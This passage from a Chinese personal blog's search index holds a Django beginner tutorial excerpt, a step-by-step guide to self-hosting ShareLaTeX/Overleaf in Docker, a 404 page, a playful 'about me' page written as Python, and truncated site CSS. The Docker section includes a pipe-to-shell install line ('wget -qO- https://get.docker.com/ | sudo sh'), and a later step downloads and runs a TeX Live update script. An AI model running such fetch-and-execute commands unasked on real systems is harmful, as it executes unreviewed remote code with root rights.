web框架，分别是Flask、Django、Tornado和Twisted，一通仔细了解以后，发现Django的开发效率似乎独占鳌头（作为一名懒人且小白，还有什么比效率高更诱人的），因此毫不犹豫地选择了django。关于django，它有着非常详细的官方文档，同时网上大佬们的相关博文多如牛毛，我作为一个后来者，就用这个系列记录一下作为一个web领域的小白在学习django框架的过程中遇到的知识点和问题的解决，不会讲很多django框架的细节，目的是希望能给到初学者一些更为通俗友好的经验，使初学者快速入门，了解框架构成、快速脱离某些坑。\n\n本系列主要参考自：\n\n{%link Django 2.0文档,docs.djangoproject.com,https://docs.djangoproject.com/zh-hans/2.0/intro/ %}\n\n{%link Django教程,runoob.com,https://www.runoob.com/django/django-tutorial.html %}\n\n## 安装Django\n\n\n一开始不懂，随便安装了一个，版本是2.2.5（后来网站搭完以后发现还有3版本，但好像有一些代码不兼容的地方，就懒得换了，反正2也够用），以下用的是win10系统。\n\n```bash\npip install django==2.2.5\n```\n\n安装完成以后，跑一下django-admin命令看看这个命令存不存在，要是不存在，就检查一下python安装目录下的script文件夹路径在不在环境变量里。\n\n## 生成第一个django项目\n\n```bash\ndjango-admin startproject helloworld\n```\n\n跑完这句命令以后，在当前目录下就会生成一个叫helloworld的文件夹，可以使用tree命令来查看其目录结构：\n\n```powershell\ntree helloworld /f\n# 顺便进入项目根目录下\ncd helloworld\n# 目录结构\n```\n\n\n```raw\n│ manage.py\n│\n└─helloworld\n        asgi.py\n        settings.py\n        urls.py\n        wsgi.py\n        __init__.py\n```\n\n比较重要的初始文件有项目命令行脚本manage.py，helloworld子目录下的settings.py以及urls.py，其他文件以后用到了再提。\n\n\nmanage.py文件提供了当前项目中的很多命令行操作，一般命令都长这样：\n\n```powershell\npython manage.py 子命令\n# 例如runserver子命令可以运行该项目,并指定端口号，默认为8000\npython manage.py runserver 0.0.0.0:80\n```\n\n如果看到下面这段英文，就可以去浏览器上访问`http://127.0.0.1/`，如果看到一个小火箭的页面，就意味着项目初始化没有任何问题。\n\n```raw\nWatching for file changes with StatReloader\nPerforming system checks...\nSystem check identified no issues (0 silenced).\nYou have 17 unapplied migration(s). Your project may not work properly until you apply the migrations for app(s): admin, auth, contenttypes, sessions.\nRun 'python manage.py migrate' to apply them.\nJuly 11, 2020 - 23:17:25\nDjango version 2.2.5, using settings 'helloworld.settings'\nStarting development server at http://0.0.0.0:80/\nQuit the server with CTRL-BREAK.\n```\n\n另外如上面的提示信息：`Django version 2.2.5, using settings 'helloworld.settings'`所示，helloworld子文件夹下面的settings.py中包含了该项目中的一些基本设置，目前完全不需要搞明白每一个参数具体是什么意思，需要的时候再一一了解即可。\n\n\n### App\n\n\napp是项目中带有一定集成功能的子模块，一个项目可以由很多app组成，比如登录模块等。\n\n```powershell\n# manage.py自带的startapp app_name 指令可以生成一个app\npython manage.py startapp one_app\ntree one_app \\f\n```\n\n\n```raw\n│  admin.py\n│  apps.py\n│  models.py\n│  tests.py\n│  views.py\n│  __init__.py\n│\n└─migrations\n        __init__.py\n```\n\n一个app的目录结构如上。\n\n\n接下来需要注册app，似乎是为了之后的admin页面与数据库相关操作能够正常进行。打开settings.py找到第33行，在`INSTALLED_APPS`列表最后添加：\n\n```python\n'one_app',\n```","tags":["Django","Python"],"categories":["学习笔记"]},{"title":"ShareLaTeX服务器部署","url":"//blog/186/","content":"\nOverleaf是一款功能强大的多人共享在线latex编译器，很多人都会在上面编辑论文，但由于长城防火墙的存在，在国内访问这一部署于国外的网站通常响应缓慢。因此有必要自己搭建一下类似的服务以方便各类论文、文档的撰写。\n\n写这篇文章时，博主本人还是一个Linux小白（对着Shell黑框框不知道这玩意能干啥的那种），因此在搭建过程中踩了不少的坑，在一一爬出这些坑，最终搭建成功以后，本人写了一点经验如下文所示。\n\n![](https://oss.fyz666.xyz/blogfiles/png/14286c3135707b38058622478a9f9089.png)\n\n本文参考自这篇文章：\n\n{%link Docker部署ShareLaTeX,m.mamicode.com,http://m.mamicode.com/info-detail-2959302.html %}\n\n## 主要软硬件依赖\n\n\n- 阿里云轻量应用服务器学生机一台（系统镜像：Ubuntu18.04，1核CPU 2G内存 40G系统盘 5Mbps峰值带宽），用学生机主要是因为穷\n- Docker 社区版，版本19.03.12\n\n## 安装Docker\n\n\n首先使用SSH工具连接服务器（什么？你还不知道SSH是啥？~~其实我当时零基础确实不知道~~[点击了解一下](https://zh.wikipedia.org/wiki/Secure_Shell)，这里我用了阿里云控制台的实例远程连接功能，非常的方便）。接下来，由于我们的ShareLaTeX是要部署在docker容器中的，因此先安装一下社区版的docker。\n\n{% tabs tab1 %}\n\n<!-- tab 通过脚本快速安装 -->\n\n\n目前有许多docker的安装脚本，例如Ubuntu系统可以直接执行下面代码：\n\n```bash\nwget -qO- https://get.docker.com/ | sudo sh\n```\n<!-- endtab -->\n\n<!-- tab 按部就班的普通安装 -->\n\n\n非脚本化的安装方法如下：\n\n\n安装之前为了提升安装的速度，先设置一下Ubuntu的apt源。\n\n```bash\nsudo vi /etc/apt/sources.list\n```\n\n在上述打开的文件中添加以下几行：\n\n```plaintext\ndeb http://mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiverse\ndeb http://mirrors.aliyun.com/ubuntu/ bionic-security main restricted universe multiverse\ndeb http://mirrors.aliyun.com/ubuntu/ bionic-updates main restricted universe multiverse\ndeb http://mirrors.aliyun.com/ubuntu/ bionic-proposed main restricted universe multiverse\ndeb http://mirrors.aliyun.com/ubuntu/ bionic-backports main restricted universe multiverse\ndeb-src http://mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiverse\ndeb-src http://mirrors.aliyun.com/ubuntu/ bionic-security main restricted universe multiverse\ndeb-src http://mirrors.aliyun.com/ubuntu/ bionic-updates main restricted universe multiverse\ndeb-src http://mirrors.aliyun.com/ubuntu/ bionic-proposed main restricted universe multiverse\ndeb-src http://mirrors.aliyun.com/ubuntu/ bionic-backports main restricted universe multiverse\ndeb [arch=amd64] https://download.docker.com/linux/ubuntu bionic stable\n```\n\n再更新一下apt的可获取软件及其版本信息，并安装一些基本依赖。\n\n```bash\nsudo apt-get update\nsudo apt-get install apt-transport-https ca-certificates curl gnupg-agent software-properties-common\n```\n\n添加docker官方的GPG Key\n\n```bash\ncurl -fsSL https://download.docker.com/linux/ubuntu/gpg|apt-key add -\n```\n\n运行以下命令：\n\n\n\n```bash\napt-key fingerprint 0EBFCD88\n```\n\n若输出以下信息则意味着成功：\n\n\n\n```raw\npub rsa4096 2017-02-22 [SCEA]\n9DC8 5822 9FC7 DD38 854A E2D8 8D81 803C 0EBF CD88\nuid [ unknown] Docker Release (CE deb) docker@docker.com\nsub rsa4096 2017-02-22 [S]\n```\n\n设置稳定的存储库：\n\n\n\n```bash\nsudo add-apt-repository \"deb [arch=amd64] https://download.docker.com/linux/ubuntu $(lsb_release -cs) stable\"\n```\n\n接下来可以安装docker了，同时为了方便起见，再安装一个docker-compose，后者可以轻松高效地管理docker容器，通常用于定义、运行多容器 docker 。\n\n\n\n```bash\nsudo apt install docker-ce\nsudo apt install docker-compose\n```\n\n<!-- endtab -->\n\n{% endtabs %}\n\n以上命令结束后，如果你从未用过docker，可以使用以下命令简单体验一下：\n\n\n\n```bash\nsudo docker run -d -p 80:80 daocloud.io/daocloud/dao-2048:master-a2c564e\n```\n\n命令执行完毕后，先在阿里云实例防火墙打开80端口，然后在浏览器中访问`http://ip`，若你打开了一个2048小游戏，那么恭喜你可以进入下一步了！\n\n\n修改docker镜像源\n\n\n\n```bash\nsudo vi /etc/docker/daemon.json\n```\n\n在打开的文件中添加以下内容：\n\n\n\n```json\n{\n    \"registry-mirrors\": [\"https://2lqq34jg.mirror.aliyuncs.com\"]\n}\n```\n\n## 拉取ShareLaTeX镜像\n\n\n\n```bash\nsudo docker pull ShareLaTeX/ShareLaTeX\n```\n\n接下来需要下载一个docker-compose.yml文件，内容是ShareLaTeX及依赖数据库容器的配置。\n\n\n点击[官方链接](https://raw.githubusercontent.com/overleaf/overleaf/main/docker-compose.yml)获取该文件。\n\n\n官方链接打不开的可以从[此处打开](https://pan.baidu.com/s/1c-u6DyRrJidJi-tEO4t_Uw)，提取码：y26d\n\n\n\n```bash\nmkdir -p ~/ShareLaTeX  # 在用户目录下创建一个ShareLaTeX文件夹，以方便区分\ncd ~/ShareLaTeX\n```\n\n将刚才下载的docker-compose.yml文件放入~/ShareLaTeX文件夹下。服务将部署在服务器的80端口，若你想要修改，则将ports后面第一个80修改为你需要的端口即可。其他的几条比较有用的配置项我列在了下面：\n\n\n- ShareLaTeX_ADMIN_EMAIL # 管理员邮箱，用以替换默认的placeholder@example.com\n- ShareLaTeX_SITE_URL # 站点链接（用以在邮件中生成可以打开的超链接）\n- ShareLaTeX_EMAIL_FROM_ADDRESS # 发送邮件的邮箱，若不设置则不开启邮件功能\n- ShareLaTeX_EMAIL_SMTP_HOST # 邮箱的SMTP服务器\n- ShareLaTeX_EMAIL_SMTP_PORT # SMTP服务器端口\n- ShareLaTeX_EMAIL_SMTP_SECURE # 若使用SSL则设为\"true\"\n- ShareLaTeX_EMAIL_SMTP_USER # 用户名，与前面的邮箱相同即可\n- ShareLaTeX_EMAIL_SMTP_PASS # 邮箱提供的身份认证码（不一定是邮箱密码）\n- ShareLaTeX_EMAIL_SMTP_TLS_REJECT_UNAUTH # 设为\"true\"\n- ShareLaTeX_EMAIL_SMTP_IGNORE_TLS # 设为\"false\"\n\n接下来运行docker-compose。\n\n\n\n```bash\nsudo docker-compose up -d\n```\n\n如果遇到端口冲突问题，请检查一下本地端口的占用情况。\n\n\n命令运行完毕后，需要进一步升级安装完整版的Texlive\n\n\n\n```bash\nsudo docker exec -it ShareLaTeX bash  # 进入ShareLaTeX容器\ncd /usr/local/texlive\nwget http://mirror.ctan.org/systems/texlive/tlnet/update-tlmgr-latest.sh\nsh update-tlmgr-latest.sh -- --upgrade\n# 更换Texlive下载源，不然会慢的一批\ntlmgr option repository https://mirrors.tuna.tsinghua.edu.cn/CTAN/systems/texlive/tlnet/\n# 升级tlmgr\ntlmgr update --self --all\n# 更新字体缓存\nluaotfload-tool -fu\n# 最关键也是耗费时间最长的一步，安装完整版的texlive\ntlmgr install scheme-full\n```\n\n上面命令如果之前没换镜像可以跑三四个小时，换了镜像的情况下几十分钟内应该就结束了，命令运行过程中不要断开SSH，如果一定要断开，可以把上面最后一条命令换成：\n\n\n\n```bash\nnohup tlmgr install scheme-full &\n```\n\n安装完以后退出ShareLaTeX命令行并重启容器\n\n\n\n```bash\nexit\nsudo docker restart ShareLaTeX\n```\n\n接下来就可以愉快地进入浏览器访问`http://[服务器ip]`，如果前面运行成功，你会看到overleaf的界面（如果遇到502 Bad Gateway，稍等片刻再访问即可）。进入`http://[服务器ip]/launchpad`创建你的admin账户，登录网站，ShareLaTeX就可以正常使用啦。\n\n\n但是目前的ShareLaTeX可能不支持中文和各种字体，需要进一步配置。\n\n\n## 配置中文环境与字体\n\n\n将Windows自带的fonts（C://windows/fonts）上传到服务器的根目录下。\n\n\n\n```plaintext\ncd /fonts  # 进入目录\nrm -r *.fon  # 删除所有.fon文件\ncd ..\ntar -zcvf fonts.tar.gz fonts/  # 打包字体文件\nsudo docker cp fonts.tar.gz ShareLaTeX:/root  # 将打包后的文件传入ShareLaTeX容器的root目录下\nsudo docker exec -it ShareLaTeX bash\nsudo apt-get install xfonts-wqy\ncd ~  # 进入root目录\ntar -zxvf fonts.tar.gz  # 解压字体文件，移动到/usr/share/fonts/目录下\nsudo mv fonts /usr/share/fonts/\ncd /usr/share/fonts/fonts/\n# 以下安装字体\nmkfontscale\nmkfontdir\nfc-cache -fv\n# 检查中文字体是否安装成功\nfc-list :lang=zh-cn\n```\n\n至此，中文字体已经可以使用了，全部部署工作就此完成！\n","tags":["Docker","LaTeX","Linux","ShareLaTeX"],"categories":["瞎捣鼓经历"]},{"title":"404 Not Found","url":"//404.html","content":"\n## 页面不见了...\n\n您想要访问的页面似乎不在这个星球。\n\n您可以移步[主页](/)，或联系网站所有者补上此页面。您也可以<a href=\"javascript:document.getElementsByClassName('search')[0].click()\">搜索</a>看看您想找的内容跑到哪里去了。\n\n"},{"title":"关于我","url":"/about/index.html","content":"\n\n```python\nimport random\n\n\nclass Myself(Human):\n\n    def __init__(self):\n        super(Myself, self).__init__()\n        self.username = 'WindShadow'\n        self.username_cn = '风的影子'\n        self.birthday = 919526400\n        self.gpg_pub_key = 'https://keys.openpgp.org/vks/v1/by-fingerprint/B4ADB2D4BB3EBD5E387BA401B8674F373ACBD2AD'\n\n    @property\n    def mbti(self):\n        \"\"\"\n        Mostly INFP-A, sometimes ISFP-A, details at:\n\n        https://www.16personalities.com/infp-personality\n        https://www.16personalities.com/articles/assertive-mediator-infp-a-vs-turbulent-mediator-infp-t\n        https://www.16personalities.com/isfp-personality\n        https://www.16personalities.com/articles/assertive-adventurer-isfp-a-vs-turbulent-adventurer-isfp-t\n        \"\"\"\n        return random.choises(['INFP-A', 'ISFP-A'], [0.85, 0.15], k=1)[0]\n    \n    @property\n    def hobbies(self):\n        \"\"\"\n        What I tend to do in my spare time \n        \"\"\"\n        return [\n            ('捣鼓电脑', 0.8),\n            ('立直麻将', 0.7),\n            ('各种牌类', 0.5),\n            ('Steam', 0.5),\n            ('羽毛球', 0.1)  # Tend to be lazy...\n        ]\n\n    @property\n    def IT_skills(self):\n        if random.random() < 0.9:\n            return [\n                \"写bug\",\n                \"写💩山\"\n            ]\n        return {\n            \"backend\": [\n                {\"name\": \"Python\", \"desc\": \"我最常用的编程语言\"},\n                {\"name\": \"C++\", \"desc\": \"正在学习中...\"},\n                {\"name\": \"Linux\", \"desc\": \"我长期使用的操作系统\"},\n                {\"name\": \"Docker\", \"desc\": \"我最常用的虚拟化技术\"},\n                {\"name\": \"Bash\", \"desc\": \"多少会点(x\"},\n                {\"name\": \"Nginx\", \"desc\": \"我最常用的Web服务\"},\n                {\"name\": \"MySQL\", \"desc\": \"会写几条CRUD的水平\"},\n                {\"name\": \"NodeJS\", \"desc\": \"毕竟在用Hexo，总不能不学这个\"}\n            ],\n            \"frontend\": [\n                {\"name\": \"JavaScript\", \"desc\": \"马马虎虎吧～\"},\n                {\"name\": \"CSS\", \"desc\": \"说实话我很讨厌写CSS\"},\n                {\"name\": \"HTML\", \"desc\": \"这也能算skill？\"},\n                {\"name\": \"Vue\", \"desc\": \"仅仅用过几次就写进来会不会不太好\"},\n                {\"name\": \"jQuery\", \"desc\": \"复古但好用的JavaScript框架\"}\n            ],\n            \"other-tools\": [\n                {\"name\": \"LaTeX\", \"desc\": \"LaTeX大法好，远离Word保平安\"},\n                {\"name\": \"PyTorch\", \"desc\": \"我最常用的深度学习框架\"},\n                {\"name\": \"Git\", \"desc\": \"天天在用但又不敢说自己会的东西\"},\n                {\"name\": \"Vim\", \"desc\": \"我在服务器上的首选文本编辑器\"},\n                {\"name\": \"VSCode\", \"desc\": \"目前在用的开发工具\"}\n            ]\n        }\n\n    @property\n    def education_background(self):\n        return [\n            {\n                \"school\": \"慈溪市实验小学\",\n                \"from\": \"2005\",\n                \"to\": \"2011\",\n                \"type\": None,\n                \"major\": None,\n                \"degree\": None\n            },\n            {\n                \"school\": \"慈溪实验中学\",\n                \"from\": \"2011\",\n                \"to\": \"2014\",\n                \"type\": None,\n                \"major\": None,\n                \"degree\": None\n            },\n            {\n                \"school\": \"浙江省慈溪中学\",\n                \"from\": \"2014\",\n                \"to\": \"2016\",\n                \"type\": \"理科实验班\",\n                \"major\": None,\n                \"degree\": None\n            },\n            {\n                \"school\": \"合肥某技术学校\",\n                \"from\": \"2016\",\n                \"to\": \"2020\",\n                \"type\": \"少院\",\n                \"major\": \"概率统计\",\n                \"degree\": \"理学学士\"\n            },\n            {\n                \"school\": \"合肥某技术学校\",\n                \"from\": \"2020\",\n                \"to\": \"now\",\n                \"type\": \"大数据学院\",\n                \"major\": \"数据科学\",\n                \"degree\": \"在读工学博士研究生\"\n            }\n        ]\n\n    @property\n    def research_interests(self):\n        return [\n            # \"数学\",\n            \"深度学习\",\n            \"一切有意思的东西\"\n        ]\n\n    @property\n    def language(self):\n        return {\n            \"zh-cn\": {\n                \"proficiency\": \"native\",\n                \"desc\": \"毕竟母语\"\n            },\n            \"zh-hant\": {\n                \"proficiency\": \"almost native\",\n                \"desc\": \"能够无障碍阅读,但不太能写\"\n            },\n            \"en\": {\n                \"proficiency\": \"intermediate\",\n                \"desc\": \"Able to read & write basically, but not good at listening & speaking\"\n            },\n            \"ja\": {\n                \"proficiency\": \"basic\",\n                \"desc\": \"すみません、私は日本語を食べませんね\"\n            }\n        }\n\n```\n\n"},{"title":"分类","url":"/categories/index.html"},{"url":"/css/custom.css","content":"html{\n    scroll-behavior: smooth;\n}\n@font-face{\n    font-family: 'LXGW Marker Gothic';\n    src: url('https://oss.fyz666.xyz/blogfiles/ttf/LXGWMarkerGothicRegular.ttf');\n}\nbody {\n    font-family: 'LXGW Marker Gothic';\n    font-size: 16px;\n    word-break: break-all;\n}\n:root {\n    --heo-white: var(--fyz-white);\n    --heo-white-op: rgba(255,255,255,0.2);\n    --heo-black: var(--fyz-black);\n    --heo-black-op: rgba(0,0,0,0.2);\n    --heo-none: var(--fyz-0);\n    --heo-gray: #999999;\n    --heo-vip: #e5a80d;\n    --heo-main: var(--heo-theme);\n    --heo-main-op: var(--heo-theme-op);\n    --heo-shadow-theme: 0 8px 12px -3px var(--heo-theme-op);\n    --heo-shadow-main: 0 8px 12px -3px var(--heo-main-op);\n    --heo-shadow-blue: 0 8px 12px -3px rgba(40, 109, 234,.20);\n    --heo-shadow-white: 0 8px 12px -3px rgba(255, 255, 255,.20);\n    --heo-shadow-black: 0 0 12px 4px rgba(0, 0, 0,.05);\n    --heo-shadow-yellow: 0px 38px 77px -26px rgba(255, 201, 62,.12);\n    --heo-shadow-red: 0 8px 12px -3px #ee7d7936;\n    --heo-shadow-green: 0 8px 12px -3px #87ee7936;\n    --heo-logo-color: linear-gradient(215deg,#4584ff 0%,#cf0db9 100%);\n    --heo-snackbar-time: 5s;\n    --style-border: 1px solid var(--heo-card-border);\n    --style-border-always: 1px solid var(--heo-card-border);\n    --style-border-hover: 1px solid var(--heo-main);\n    --style-border-hover-always: 1px solid var(--heo-main);\n    --style-border-dashed: 1px dashed var(--heo-theme-op);\n    \n    --heo-theme: #425AEF;\n    --heo-theme-op: #4259ef23;\n    --heo-blue: #425AEF;\n    --heo-red: #D8213C;\n    --heo-pink: #FF7C7C;\n    --heo-green: #28a63f;\n    --heo-yellow: #d99c00;\n    --heo-orange: #e38100;\n    --heo-fontcolor: #363636;\n    --heo-background: #f7f9fe;\n    --heo-reverse: var(--fyz-black);\n    --heo-maskbg: rgba(255, 255, 255, 0.6);\n    --heo-maskbgdeep: rgba(255, 255, 255, 0.85);\n    --heo-hovertext: var(--heo-main);\n    --heo-ahoverbg: #F7F7FA;\n    --heo-lighttext: var(--heo-main);\n    --heo-secondtext: rgba(60, 60, 67, 0.6);\n    --heo-scrollbar: rgba(60, 60, 67, 0.4);\n    --heo-card-btn-bg: #edf0f7;\n    --heo-post-blockquote-bg: #fafcff;\n    --heo-post-tabs-bg: #f2f5f8;\n    --heo-secondbg: #f1f3f8;\n    --heo-shadow-nav: 0 5px 12px -5px rgba(102, 68, 68, 0.05);\n    --heo-card-bg: var(--fyz-white);\n    --heo-card-bg-op: var(--heo-black-op);\n    --heo-shadow-lightblack: 0 5px 12px -5px rgba(102, 68, 68, 0.00);\n    --heo-shadow-light2black: 0 5px 12px -5px rgba(102, 68, 68, 0.00);\n    --heo-card-border: #e3e8f7;\n    --heo-shadow-border: 0 8px 16px -4px #2c2d300c;\n    --style-border-forever: 2px solid var(--heo-main);\n    --fyz-border:#c9c9c9;\n    --fyz-blue:#6cf;\n    --fyz-gray:#e2e2e2;\n    --fyz-theme:var(--fyz-blue);\n    --fyz-light-grey:#F2F2F2;\n    --fyz-green:#34d0cc;\n    --fyz-black-acrylic1: #0008;\n    --fyz-black-acrylic2: #0000;\n    --fyz-black-acrylic3:#00000099;\n    --fyz-black:black;\n    --fyz-white:white;\n    --fyz-white-acrylic1:#fffd;\n    --fyz-white-acrylic2:#fffa;\n    --fyz-blackgray:#797979;\n    --fyz-0:#0000;\n    --fyz-scrollbar: #acacacDD;\n    --fyz-whitegray:#f1f1f1;\n    --fyz-red:#d7000f;\n    --fyz-orange:#ed8e00;\n    --fyz-yellow:rgb(241, 238, 71);\n    --fyz-purple:rgb(179, 71, 241);\n    --fyz-pink:#ed709b;\n    --fyz-heoblue:#0098db;\n    --fyz-darkblue:#61649f;\n}\n[data-theme=light] {\n  --heo-theme: #425AEF;\n  --heo-theme-op: #4259ef23;\n  --heo-theme-op-deep: #4259efdd;\n  --heo-theme-none: #4259ef01;\n  --heo-blue: #425AEF;\n  --heo-red: #D8213C;\n  --heo-pink: #FF7C7C;\n  --heo-green: #28a63f;\n  --heo-yellow: #c28b00;\n  --heo-yellow-op: #d99c001a;\n  --heo-orange: #e38100;\n  --heo-fontcolor: #363636;\n  --heo-background: #f7f9fe;\n  --heo-reverse: #000;\n  --heo-maskbg: rgba(255, 255, 255, 0.6);\n  --heo-maskbgdeep: rgba(255, 255, 255, 0.85);\n  --heo-hovertext: var(--heo-main);\n  --heo-ahoverbg: #F7F7FA;\n  --heo-lighttext: var(--heo-main);\n  --heo-secondtext: rgba(60, 60, 67, 0.6);\n  --heo-scrollbar: rgba(60, 60, 67, 0.4);\n  --heo-card-btn-bg: #edf0f7;\n  --heo-post-blockquote-bg: #fafcff;\n  --heo-post-tabs-bg: #f2f5f8;\n  --heo-secondbg: #f1f3f8;\n  --heo-shadow-nav:0 5px 12px -5px rgba(102, 68, 68, 0.05);\n  --heo-card-bg: #fff;\n  --heo-card-bg-op: var(--heo-black-op);\n  --heo-card-bg-none: rgba(255, 255, 255, 0);\n  --heo-shadow-lightblack:0 5px 12px -5px rgba(102, 68, 68, 0.00);\n  --heo-shadow-light2black:0 5px 12px -5px rgba(102, 68, 68, 0.00);\n  --heo-card-border: #e3e8f7;\n  --heo-shadow-border: 0 8px 16px -4px #2c2d300c;\n  --style-border-forever: 2px solid var(--heo-main);\n}\n\n[data-theme=dark] {\n  --heo-theme: #0084FF;\n  --heo-theme-op: #0084FF23;\n  --heo-theme-op-deep: #0084ffdd;\n  --heo-theme-none: #0084FF00;\n  --heo-blue: #0084FF;\n  --heo-red: #FF3842;\n  --heo-pink: #FF7C7C;\n  --heo-green: #57bd6a;\n  --heo-yellow: #ffc93e;\n  --heo-yellow-op: #ffc93e30;\n  --heo-orange: #ff953e;\n  --heo-fontcolor: #F7F7FA;\n  --heo-background: #18171d;\n  --heo-reverse: #fff;\n  --heo-maskbg: rgba(0,0,0, 0.6);\n  --heo-maskbgdeep: rgba(0,0,0, 0.85);\n  --heo-hovertext: #0A84FF;\n  --heo-ahoverbg: #fff;\n  --heo-lighttext: #f2b94b;\n  --heo-secondtext: #a1a2b8;\n  --heo-scrollbar: rgba(200, 200, 223, 0.4);\n  --heo-card-btn-bg: #30343f;\n  --heo-post-blockquote-bg: #000;\n  --heo-post-tabs-bg: #121212;\n  --heo-secondbg: #30343f;\n  --heo-shadow-nav:0 5px 20px 0px rgba(28, 28, 28, 0.4);\n  --heo-card-bg: #1d1e22;\n  --heo-card-bg-op: var(--heo-white-op);\n  --heo-card-bg-none: #1d1b2600;\n  --heo-shadow-lightblack:0 5px 12px -5px rgba(102, 68, 68, 0.0);\n  --heo-shadow-light2black:0 5px 12px -5px rgba(102, 68, 68, 0.0);\n  --heo-card-border: #282829;\n  --heo-shadow-border: 0 8px 16px -4px #00000050;\n  --style-border-forever: 2px solid var(--heo-lighttext);\n}\n::selection {\n    color: var(--fyz-white);\n    background: var(--fyz-theme);\n}\n.aplayer-body{\n    padding-right: 0!important;\n}\n.aplayer .aplayer-lrc{\n    display: none!important;\n}\n.aplayer.aplayer-fixed{\n    background-color:#0000;\n}\n.aplayer.aplayer-fixed .aplayer-body{\n    bottom: 10px!important;\n    left: 10px!important;\n    background: #fffa!important;\n    border-radius: 10px;\n    backdrop-filter: blur(10px);\n    -webkit-border-radius: 10px;\n    -moz-border-radius: 10px;\n    -ms-border-radius: 10px;\n    -o-border-radius: 10px;\n    border: 1px solid var(--fyz-border)!important;\n    box-shadow: var(--heo-shadow-border);\n    width: 284px !important;\n}\n.aplayer-info{\n    border-top: none!important;\n}\n.aplayer-list li{\n    margin: 5px!important;\n    border-radius: 5px;\n    border:none!important;\n    height: 28px!important;\n    line-height: 28px!important;\n}\n.aplayer .aplayer-list ol li .aplayer-list-cur{\n    height:18px!important;\n}\n[data-theme=\"dark\"] .aplayer .aplayer-list ol *{\n    color:white!important;\n}\n.aplayer .aplayer-list ol li.aplayer-list-light{\n    background-color: #9e9e9e5c!important;\n}\n.aplayer .aplayer-list li:hover{\n    background-color: #9e9e9e5c!important;\n}\n[data-theme=\"dark\"] .aplayer.aplayer-fixed .aplayer-body{\n    bottom: 10px!important;\n    left: 10px!important;\n    background: #0008!important;\n    border-radius: 10px;\n    backdrop-filter: blur(10px);\n    -webkit-border-radius: 10px;\n    -moz-border-radius: 10px;\n    -ms-border-radius: 10px;\n    -o-border-radius: 10px;\n    color:white!important;\n}\n.aplayer.aplayer-fixed .aplayer-body:hover{\n    border: 1px solid var(--fyz-theme)!important;\n    box-shadow:0 0 3px var(--fyz-theme)!important;\n}\n.aplayer-pic{\n    border-radius: 10px;\n    -webkit-border-radius: 10px;\n    -moz-border-radius: 10px;\n    -ms-border-radius: 10px;\n    -o-border-radius: 10px;\n}\n[data-theme=\"dark\"] .aplayer .aplayer-info .aplayer-music .aplayer-author,[data-theme=\"dark\"] .aplayer .aplayer-info .aplayer-controller .aplayer-time{\n    color:white!important;\n}\n[data-theme=\"dark\"] .aplayer .aplayer-info .aplayer-controller .aplayer-time .aplayer-icon:hover path {\n    fill: var(--fyz-white)!important;\n}\n.aplayer.aplayer-fixed .aplayer-list{\n    border: none!important;\n}\n.aplayer .aplayer-pic{\n    transform:translateX(-1px);\n    -webkit-transform:translateX(-1px);\n    -moz-transform:translateX(-1px);\n    -ms-transform:translateX(-1px);\n    -o-transform:translateX(-1px);\n}\n.aplayer.aplayer-fixed .aplayer-list{\n    background-color: var(--fyz-white-acrylic1);\n    transform: translate(100px,-20px);\n    width: 200px;\n    border-radius: 10px;\n    backdrop-filter: blur(10px);\n    -webkit-transform: translate(100px,-20px);\n    -moz-transform: translate(100px,-20px);\n    -ms-transform: translate(100px,-20px);\n    -o-transform: translate(100px,-20px);\n}\n[data-theme=\"dark\"] .aplayer.aplayer-fixed .aplayer-list{\n    background-color: var(--fyz-black-acrylic1)!important;\n}\n.aplayer{\n    font-family: var(--global-font),-apple-system, IBM Plex Mono ,monosapce,\"微软雅黑\", sans-serif;\n}\n.aplayer.aplayer-fixed .aplayer-icon-lrc{\n    display: none!important;\n}\n.aplayer .aplayer-miniswitcher{\n    height: 40%!important;\n    left: 290px;\n    border-radius: 8px!important;\n    -webkit-border-radius: 8px!important;\n    -moz-border-radius: 8px!important;\n    -ms-border-radius: 8px!important;\n    -o-border-radius: 8px!important;\n    top:20px!important;\n}\n.aplayer-narrow .aplayer-miniswitcher{\n    position: fixed!important;\n    left:300px!important;\n    bottom:10px!important;\n    height: 26px!important;\n}\n.aplayer-fixed.aplayer-narrow .aplayer-body{\n    transition: all 1s;\n    transform: translateX(-300px);\n    -webkit-transform: translateX(-300px);\n    -moz-transform: translateX(-300px);\n    -ms-transform: translateX(-300px);\n    -o-transform: translateX(-300px);\n    -webkit-transition: all 1s;\n    -moz-transition: all 1s;\n    -ms-transition: all 1s;\n    -o-transition: all 1s;\n}\n[data-theme='light'] #archive{\n    background-color: var(--fyz-white-acrylic1);\n    backdrop-filter: blur(30px) saturate(180%);\n    -webkit-backdrop-filter: blur(30px) saturate(180%);\n}\n.article-sort-item:before,.article-sort-title:before,.article-sort-title:after{\n    background: transparent!important;\n    border: none!important;\n}\n.article-sort{\n    border: none!important;\n    margin-left:0 !important;\n}\n.article-sort-title{\n    margin-left:0 !important;\n    padding-left: 0!important;\n}\n.article-sort-item-title:hover{\n    color:var(--fyz-theme)!important;\n    color: black!important;\n}\n.article-sort-item-img img{\n    border-radius: 8px;\n    -webkit-border-radius: 8px;\n    -moz-border-radius: 8px;\n    -ms-border-radius: 8px;\n    -o-border-radius: 8px;\n}\n.article-sort-title{\n    margin-top:30px;\n    margin-bottom:20px;\n}\n\n.article-sort-item::before, .article-sort-title::before, .article-sort-title::after {\n    content: none;\n}\n\n.article-sort .year{\n    width:100%!important;\n    border-bottom:dashed 5px var(--fyz-theme);\n    font-size:26px;\n    margin-top:20px;\n}\n\n.article-sort{\n    border:none;\n    display:flex;\n    flex-wrap:wrap;\n    margin:20px 20px;\n    padding:0;\n}\n\n.article-sort-item:not(.year){\n    padding:8px 10px;\n    width:calc(50% - 0.8rem);\n    margin:0.4rem;\n    border: 1px solid var(--fyz-border);\n    border-radius:15px;\n    transition:0.5s;\n    height:120px;\n}\n.article-sort-item:not(.year):hover{\n    border: 1px solid var(--fyz-theme);\n}\n.article-sort-item-a{\n    position:absolute;\n    width:100%;\n    height:100%;\n}\n\n.article-sort-item-img{\n    transition:0.5s;\n    height:90px;\n    width:140px;\n}\n\n.article-sort-item > a >img{\n    border-radius:15px;\n}\n\n.article-sort-item-title {\n    padding-left: 10px;\n    margin: 10px 0;\n    text-overflow:ellipsis;\n}\n\n.article-sort-item-title:hover{\n    transform:none;\n}\n\n.article-sort-item > i{\n    width:0;\n    opacity:0;\n    overflow:hidden;\n    transition:0.5s;\n}\n\n.article-sort-item:hover:not(.year){\n    background-color:var(--fyz-theme);\n    box-shadow: 0 0 10px 